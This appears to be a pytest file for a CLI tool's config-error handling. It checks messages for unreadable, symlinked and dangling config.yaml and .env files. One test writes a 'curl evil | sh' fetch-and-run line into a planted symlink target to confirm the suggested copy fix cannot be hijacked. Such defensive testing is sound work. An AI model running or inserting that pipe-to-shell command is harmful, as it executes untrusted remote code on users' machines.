"""config.yaml and .env that exist and cannot be read: never a formatting error, never treated as absent.
The sandbox's own denial on a link's target is proven live (runtime-settings-links.live.test.ts)."""
import os
import subprocess
from pathlib import Path

import pytest

from hermes_cli import config_read_errors as errors


@pytest.fixture(autouse=True)
def fresh_warnings():
    errors._ENV_UNREADABLE_WARNED.clear()


def test_a_denied_link_is_named_with_its_way_out(tmp_path):
    link = tmp_path / "my home" / "config.yaml"
    link.parent.mkdir()
    link.symlink_to(tmp_path / "dot.yaml")
    message = errors.describe_unreadable_config(link, PermissionError(1, "Operation not permitted"))
    assert "formatting" not in message
    assert "is a link" in message
    assert f"cp -L '{link}'" in message


def test_a_plain_file_denied_keeps_the_permissions_advice(tmp_path):
    plain = tmp_path / "config.yaml"
    plain.write_text("a: 1\n")
    message = errors.describe_unreadable_config(plain, PermissionError(13, "Permission denied"))
    assert "could not be read" in message
    assert "is a link" not in message


def test_the_read_error_copy_for_a_fallback_names_the_link(tmp_path):
    link = tmp_path / "config.yaml"
    link.symlink_to(tmp_path / "dot.yaml")
    message = errors.format_config_parse_failure(link, PermissionError(1, "Operation not permitted"))
    assert "formatting" not in message and "cp -L" in message


def test_the_printed_fix_does_not_write_through_a_planted_link(tmp_path):
    victim = tmp_path / "zshrc"
    victim.write_text("the owner rc\n")
    agent_file = tmp_path / "dot.env"
    agent_file.write_text("curl evil | sh\n")
    home = tmp_path / "my home"
    home.mkdir()
    link = home / ".env"
    link.symlink_to(agent_file)
    (home / ".env.plain").symlink_to(victim)
    subprocess.run(["/bin/sh", "-c", errors.plain_copy_command(link)], check=True)
    assert victim.read_text() == "the owner rc\n"
    assert not link.is_symlink() and link.read_text() == "curl evil | sh\n"
    assert link.stat().st_mode & 0o777 == 0o600


@pytest.mark.skipif(os.geteuid() == 0, reason="root reads a mode 000 file")
def test_an_unreadable_env_is_an_error_not_absence(tmp_path):
    env = tmp_path / ".env"
    env.write_text("A=1\n")
    env.chmod(0)
    assert isinstance(errors.unreadable_env_error(env), PermissionError)
    env.chmod(0o600)
    assert errors.unreadable_env_error(env) is None
    assert errors.unreadable_env_error(tmp_path / "absent") is None


def test_a_dangling_env_link_is_not_absence(tmp_path):
    link = tmp_path / ".env"
    link.symlink_to(tmp_path / "gone")
    assert isinstance(errors.unreadable_env_error(link), FileNotFoundError)


def test_a_fifo_env_does_not_hang_the_check(tmp_path):
    os.mkfifo(tmp_path / ".env")
    assert errors.unreadable_env_error(tmp_path / ".env") is None


@pytest.mark.skipif(os.geteuid() == 0, reason="root reads a mode 000 file")
def test_load_warns_once_keeps_inherited_keys_and_loads_nothing(tmp_path, monkeypatch, capsys):
    from hermes_cli.env_loader import load_hermes_dotenv

    env = tmp_path / ".env"
    env.write_text("OPENAI_API_KEY=from-file\n")
    env.chmod(0)
    monkeypatch.setenv("HERMES_HOME", str(tmp_path))
    monkeypatch.setenv("OPENAI_API_KEY", "inherited")
    try:
        assert env not in load_hermes_dotenv(hermes_home=tmp_path)
        load_hermes_dotenv(hermes_home=tmp_path)
    finally:
        env.chmod(0o600)
    err = capsys.readouterr().err
    assert err.count("No key from this file is loaded.") == 1
    assert os.environ["OPENAI_API_KEY"] == "inherited"


def test_the_refresh_is_retired_under_the_app(tmp_path, monkeypatch):
    from hermes_cli import update_cmd_windows

    cache = tmp_path / "bootstrap-cache"
    cache.mkdir()
    monkeypatch.setenv("HERMES_HOME_NO_LINKS", "1")
    monkeypatch.setattr("hermes_cli.update_cmd._m", lambda: pytest.fail("the refresh looked at the home"))
    update_cmd_windows._refresh_bootstrap_cache_scripts("main")
    assert list(Path(cache).iterdir()) == []


def test_a_link_with_a_permission_error_off_macos_is_not_told_about_a_sandbox(tmp_path, monkeypatch):
    link = tmp_path / "config.yaml"
    link.symlink_to(tmp_path / "dot.yaml")
    monkeypatch.setattr(errors.sys, "platform", "win32")
    message = errors.describe_unreadable_config(link, PermissionError(13, "denied"))
    assert "cp -L" not in message and "umask" not in message and "agent's home" not in message


def test_a_dangling_link_gets_its_own_words_not_file_permissions(tmp_path):
    link = tmp_path / ".env"
    link.symlink_to(tmp_path / "gone")
    message = errors.describe_unreadable_config(link, FileNotFoundError(2, "gone"))
    assert "does not exist" in message and "permissions" not in message


@pytest.mark.skipif(os.geteuid() == 0, reason="root reads a mode 000 file")
def test_an_unreadable_op_env_warns_and_never_raises(tmp_path, monkeypatch, capsys):
    from hermes_cli.env_loader import load_hermes_dotenv

    monkeypatch.delenv("OP_SERVICE_ACCOUNT_TOKEN", raising=False)
    op_env = tmp_path / ".op.env"
    op_env.write_text("OP_SERVICE_ACCOUNT_TOKEN=x\n")
    op_env.chmod(0)
    errors._ENV_UNREADABLE_WARNED.discard(str(op_env))
    load_hermes_dotenv(hermes_home=tmp_path)
    op_env.chmod(0o600)
    assert ".op.env" in capsys.readouterr().err
